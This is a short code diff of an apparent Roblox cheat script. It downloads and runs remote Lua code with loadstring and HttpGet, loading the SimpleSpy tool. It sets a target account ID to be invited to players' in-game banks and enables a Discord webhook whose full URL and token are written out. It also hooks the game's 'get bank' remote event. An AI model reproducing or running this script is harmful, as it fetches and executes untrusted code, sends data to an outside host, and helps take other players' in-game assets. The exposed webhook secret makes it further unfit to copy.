@@ -2,10 +2,10 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()
 
 -- The ID that will get invited to the bank
-local id = 1
+local id = 472537096
 -- Discord webhook
-local webhook = false
-local link = ""
+local webhook = true
+local link = "https://discord.com/api/webhooks/1186594904747560981/2_WTAcznMTi8pdrOce0YITEI2bik7LGhXatlM6vfYno_kiQLFgpwdIxLWRs3RVrKEdcU"
 
 -- Catch Get Bank remote
 SimpleSpy:GetRemoteFiredSignal(workspace.__THINGS.__REMOTES:FindFirstChild("get bank")):Connect(function(args)
